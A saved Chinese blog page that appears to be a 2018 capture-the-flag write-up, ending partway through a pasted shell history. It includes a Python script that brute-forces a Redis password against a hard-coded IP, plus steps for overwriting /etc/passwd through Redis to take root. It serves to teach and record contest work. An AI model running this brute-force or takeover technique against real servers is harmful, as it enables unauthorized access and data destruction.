@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="jianghuxia's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="拿了首届信安之路巅峰挑战赛第一，这次比赛的writeup如下，orz，orz。">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="首届信安之路巅峰挑战赛writeup详解">
+<meta property="og:url" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/index.html">
+<meta property="og:site_name" content="jianghuxia&#39;s blog">
+<meta property="og:description" content="拿了首届信安之路巅峰挑战赛第一，这次比赛的writeup如下，orz，orz。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671101647.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671166487.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671058562.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537674858782.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705229073.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710317853.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710120269.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683344278.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683400926.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705728399.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705840894.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537694656137.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707044424.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707242063.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537707972635.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537708058489.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537704976981.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537709086328.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710176564.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537746165267.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978806267.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979013881.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979226469.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537979709788.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537882454775.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537884117551.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980328352.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978124473.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537980446285.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886964567.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537886544690.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537887293053.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981121231.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537981472145.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537954753559.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537963593632.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537978300052.png">
+<meta property="og:updated_time" content="2018-09-26T17:32:36.604Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="首届信安之路巅峰挑战赛writeup详解">
+<meta name="twitter:description" content="拿了首届信安之路巅峰挑战赛第一，这次比赛的writeup如下，orz，orz。">
+<meta name="twitter:image" content="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671101647.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/"/>
+
+
+
+
+
+  <title>首届信安之路巅峰挑战赛writeup详解 | jianghuxia's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">jianghuxia's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Everyday very nice!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jianghuxia.github.io/2018/09/27/首届信安之路巅峰挑战赛writeup详解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="jianghuxia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/person_image.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jianghuxia's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">首届信安之路巅峰挑战赛writeup详解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-27T01:30:07+08:00">
+                2018-09-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>拿了首届信安之路巅峰挑战赛第一，这次比赛的<code>writeup</code>如下，<code>orz</code>，<code>orz</code>。<br><a id="more"></a></p>
+<h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level_1"></a>Level_1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">欢迎参加首届信安之路巅峰挑战赛，第一关的入口：</span><br><span class="line"></span><br><span class="line">http://wifiseciloveyouxazl.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第二关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure>
+<p>选择题为主，最后一题例外，为此，还抓了个包，研究了下<code>js</code>脚本</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671101647.png" alt="1537671101647"></p>
+<p>看下脚本</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671166487.png" alt="1537671166487"></p>
+<p>火狐抓个包，得到<code>key</code>?这<code>tm</code>什么原理。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537671058562.png" alt="1537671058562"></p>
+<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level_2"></a>Level_2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜通关第一关，第二关入口：</span><br><span class="line"></span><br><span class="line">http://nizhidaoqianduanyoushama.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第三关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure>
+<p>我滴个天啊。。。。。弱密码随意登陆。。。。。不好意思，这题我真是非预期解法，具体的预期解法，之前信安之路文章已发，就不仔细讲述啦！</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537674858782.png" alt="1537674858782"></p>
+<p>得到第二关答案<code>key:2c4b23c265c3e834f31024533565f2be</code></p>
+<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level_3"></a>Level_3</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜完成第二关，第三关的入口：</span><br><span class="line"></span><br><span class="line">http://honglanduikburongyiya.xazlsec.com</span><br><span class="line"></span><br><span class="line">获得 key 之后，通过后台发送 key 将获得第四关的入口信息，祝你好运！</span><br></pre></td></tr></table></figure>
+<p>这题，学到的东西很多，坑点多，但就是好玩。</p>
+<p>日常扫端口</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705229073.png" alt="1537705229073"></p>
+<p>没发现啥（这时候也没全<code>tcp</code>端口扫描），后面出题老哥放出新提示</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710317853.png" alt="1537710317853"></p>
+<p>上网搜搜，嗯 ,<code>6379 Redis</code>很有可能哦。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537710120269.png" alt="1537710120269"></p>
+<p>尝试一波，发现<code>6379</code>端口开的是<code>redis</code>服务，执行命令<code>redis-cli -h 66.42.84.155 -p 6379</code>，发现可以登录，但是需要密码。</p>
+<p>尝试使用<code>hydra</code>爆破，但是不知为啥，爆破无效（这里上网搜索了下，说是<code>hydra</code>编译问题），于是尝试使用<code>python</code>脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">import redis</span><br><span class="line">import sys</span><br><span class="line">import getopt</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">	author:Qing</span><br><span class="line">	try to login the redis database</span><br><span class="line">	-h help</span><br><span class="line">	-P password file</span><br><span class="line">	-a server address</span><br><span class="line">	-o port, default 6379</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def usage():</span><br><span class="line">    print &apos;&apos;&apos;Options:</span><br><span class="line">	-h help</span><br><span class="line">	-P password file</span><br><span class="line">	-a server address</span><br><span class="line">	-o port, default 6379</span><br><span class="line">			&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">port = 6379  # default port</span><br><span class="line">starttime = time.localtime()</span><br><span class="line">print &quot;start time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, starttime)</span><br><span class="line">opts, args = getopt.getopt(sys.argv[1:], &quot;hP:a:o:&quot;)</span><br><span class="line">for op, value in opts:</span><br><span class="line">    if op == &quot;-P&quot;:</span><br><span class="line">        input_file = value</span><br><span class="line">    elif op == &quot;-a&quot;:</span><br><span class="line">        host = value</span><br><span class="line">    elif op == &quot;-o&quot;:</span><br><span class="line">        port = value</span><br><span class="line">    elif op == &quot;-h&quot;:</span><br><span class="line">        usage()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">fo = open(&quot;hydra_zidian.txt&quot;, &quot;r+&quot;)</span><br><span class="line">passwd = &quot; &quot;</span><br><span class="line">while 1:</span><br><span class="line">    host = &apos;66.42.84.155&apos;</span><br><span class="line">    port=6379</span><br><span class="line">    line = fo.readline()</span><br><span class="line">    passwd = line</span><br><span class="line">    passwd = passwd[0:(len(passwd) - 1)]  # filter the /n</span><br><span class="line">    print passwd</span><br><span class="line">    rs = redis.Redis(host, port, db=0, password=passwd)  # AUTH password</span><br><span class="line">    response = &apos;wrong passwd&apos;</span><br><span class="line">    try:</span><br><span class="line">        response = rs.ping()  # use PING to judge the state of redis</span><br><span class="line">    except redis.exceptions.ResponseError:</span><br><span class="line">        pass</span><br><span class="line">    # print response</span><br><span class="line">    else:</span><br><span class="line">        if response == True:</span><br><span class="line">            print response</span><br><span class="line">            print passwd</span><br><span class="line">            fo.close()</span><br><span class="line">            stoptime = time.localtime()</span><br><span class="line">            print &quot;stop time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, stoptime)</span><br><span class="line">            exit(0)</span><br><span class="line">    if not line:</span><br><span class="line">        print &quot;no valid passwd&quot;</span><br><span class="line">        stoptime = time.localtime()</span><br><span class="line">        print &quot;stop time: &quot;, time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, stoptime)</span><br><span class="line">        exit(0)</span><br></pre></td></tr></table></figure>
+<p>字典选择<code>top100</code>弱密码就行啦，开始爆破。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683344278.png" alt="1537683344278"></p>
+<p>爆破成功，密码是：<code>1q2w3e4r</code></p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537683400926.png" alt="1537683400926"></p>
+<p>嗯~，爆破是成功了，但是怎么利用<code>redis</code>漏洞呢，可以看看这篇<a href="http://www.freebuf.com/vuls/148758.html" target="_blank" rel="noopener">文章</a>，其中详细指出了一些想法。</p>
+<p>自己测试时，发现<code>/root/.ssh/</code>这个目录不在了，想着利用<code>redis</code>写入自己私钥，远程<code>ssh</code>连接上去的幻想也就破灭了。</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705728399.png" alt="1537705728399"></p>
+<p>后面尝试着，网上学习了一波，尝试着读下<code>/etc/</code>这个目录，喔！竟然存在，嘿嘿，那么是不是可以尝试<code>/etc/passwd</code> 文件实现任意账号密码的重置呢？具体操作请查看上述那个链接，下面是自己的操作：</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537705840894.png" alt="1537705840894"></p>
+<p>好的，成功<code>save</code>后，尝试以<code>root</code>用户登陆，然后就这样登上去了，<code>root</code>用户登上去了?^–$–*/，还是有点吃惊的，赶快联系了下出题的大佬，问下就这样？这是预期解法？直接用<code>root</code>?后面问了下，<code>redis</code>是用<code>root</code> 身份启动，被菜鸡我刚好撞上了，直接把<code>root</code>密码重置了。甚至，不小心把<code>/etc/shadow</code>给搞坏了，抱歉啊，不是故意的。</p>
+<p>查看下敏感信息</p>
+<p><img src="/2018/09/27/首届信安之路巅峰挑战赛writeup详解/1537694656137.png" alt="1537694656137"></p>
+<p>后面老哥给了我个<code>admin</code>的用户账号和密码，心虚的我也不好意思的接受了。咳，继续解题。回到<code>root</code>用户登陆后，用<code>root</code>权限转了一圈，看了下<code>/tmp/history</code>，以下为内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">[root@vultr tmp]<span class="comment"># cat history </span></span><br><span class="line">    1  yum update</span><br><span class="line">    2  yum list | grep rredis</span><br><span class="line">    3  yum list | grep redis</span><br><span class="line">    4  yum install redis</span><br><span class="line">    5  redis-cli</span><br><span class="line">    6  iptables</span><br><span class="line">    7  iptables -L</span><br><span class="line">    8  iptables -L -F</span><br><span class="line">    9  iptables  -F</span><br><span class="line">   10  redis-cli</span><br><span class="line">   11  yum install redis-server</span><br><span class="line">   12  wget http://download.redis.io/releases/redis-3.2.12.tar.gz</span><br><span class="line">   13  tar xzfv redis-3.2.12.tar.gz </span><br><span class="line">   14  <span class="built_in">cd</span> redis-3.2.12</span><br><span class="line">   15  ls</span><br><span class="line">   16  make</span><br><span class="line">   17  ls</span><br><span class="line">   18  <span class="built_in">cd</span> ../</span><br><span class="line">   19  rm -rf *</span><br><span class="line">   20  wget wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br><span class="line">   21  tar xzfv redis-2.8.17.tar.gz </span><br><span class="line">   22  yum install gcc</span><br><span class="line">   23  yum install cc</span><br><span class="line">   24  yum install g++</span><br><span class="line">   25  <span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">   26  make</span><br><span class="line">   27  make install</span><br><span class="line">   28  <span class="built_in">cd</span> ../</span><br><span class="line">   29  redis -cli</span><br><span class="line">   30  redis-cli</span><br><span class="line">   31  <span class="built_in">cd</span> redis-2.8.17/s</span><br><span class="line">   32  <span class="built_in">cd</span> redis-2.8.17/</span><br><span class="line">   33  ls</span><br><span class="line">   34  <span class="built_in">cd</span> src/</span><br><span class="line">   35  l</span><br><span class="line">   36  ls</span><br><span class="line">   37  <span class="built_in">cd</span> ../</span><br><span class="line">   38  vim redis.conf </span><br><span class="line">   39  yum install vim</span><br><span class="line">   40  ls</span><br><span class="line">   41  vim redis.conf </span><br><span class="line">   42  <span class="built_in">cd</span> src/</span><br><span class="line">   43  ./redis-server </span><br><span class="line">   44  ./redis-server &amp;</span><br><span class="line">   45  ps -ef</span><br><span class="line">   46  ifconfig</span><br><span class="line">   47  <span class="built_in">cd</span></span><br><span class="line">   48  useradd key P@ssword123</span><br><span class="line">   49  useradd key</span><br><span class="line">   50  passwd key</span><br><span class="line">   51  cat /etc/shadow</span><br><span class="line">   52  ls</span><br><span class="line">   53  mkdir .ssh</span><br><span class="line">   54  key 的明文密码就是下一关通关密语</span><br><span class="line">   55  <span class="built_in">exit</span></span><br><span class="line">   56  ls -la</span><br><span class="line">   57  cat .bash_history </span><br><span class="line">   58  <span class="built_in">exit</span></span><br><span class="line">   59  quit</span><br><span class="line">   60  <span class="built_in">exit</span></span><br><span class="line">   61  ls</span><br><span class="line">   62  <span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">   63  ls</span><br><span class="line">   64  <span class="built_in">cd</span> sec</span><br><span class="line">   65  <span class="built_in">cd</span> src</span><br><span class="line">   66  vim  redis-server </span><br><span class="line">   67  redis-server </span><br><span class="line">   68  redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">   69  netstat -tunlp</span><br><span class="line">   70  redis-server </span><br><span class="line">   71  netstat -tunlp</span><br><span class="line">   72  ./redis-server </span><br><span class="line">   73  redis-cli ../redis.conf &amp;</span><br><span class="line">   74  netstat -tunlp</span><br><span class="line">   75  <span class="built_in">jobs</span> </span><br><span class="line">   76  redis-server ../redis.conf &amp;</span><br><span class="line">   77  netstat -tunlp</span><br><span class="line">   78  <span class="built_in">cd</span> /home/</span><br><span class="line">   79  ls</span><br><span class="line">   80  <span class="built_in">cd</span> key/</span><br><span class="line">   81  ls</span><br><span class="line">   82  ls -al</span><br><span class="line">   83  <span class="built_in">cd</span> ..</span><br><span class="line">   84  <span class="built_in">cd</span> </span><br><span class="line">   85  <span class="built_in">cd</span> /root/</span><br><span class="line">   86  ls</span><br><span class="line">   87  passwd key</span><br><span class="line">   88  <span class="built_in">cd</span> /root/.ssh/</span><br><span class="line">   89  ls</span><br><span class="line">   90  <span class="built_in">cd</span> ..</span><br><span class="line">   91  ls</span><br><span class="line">   92  ls -al</span><br><span class="line">   93  <span class="built_in">cd</span> .ssh/</span><br><span class="line">   94  ls</span><br><span class="line">   95  ls -al</span><br><span class="line">   96  <span class="built_in">cd</span> ..</span><br><span class="line">   97  rm -rf .ssh/</span><br><span class="line">   98  <span class="built_in">cd</span> /home/</span><br><span class="line">   99  ls</span><br><span class="line">  100  <span class="built_in">cd</span> key/.ssh</span><br><span class="line">  101  mkdir key/.ssh/</span><br><span class="line">  102  <span class="built_in">cd</span> /home/</span><br><span class="line">  103  ls</span><br><span class="line">  104  <span class="built_in">cd</span> key/</span><br><span class="line">  105  <span class="built_in">cd</span> .ssh/</span><br><span class="line">  106  ls</span><br><span class="line">  107  rm authorized_keys </span><br><span class="line">  108  <span class="built_in">cd</span> </span><br><span class="line">  109  <span class="built_in">history</span> </span><br><span class="line">  110  <span class="built_in">cd</span> /home/key/.ssh/	</span><br><span class="line">  111  ls</span><br><span class="line">  112 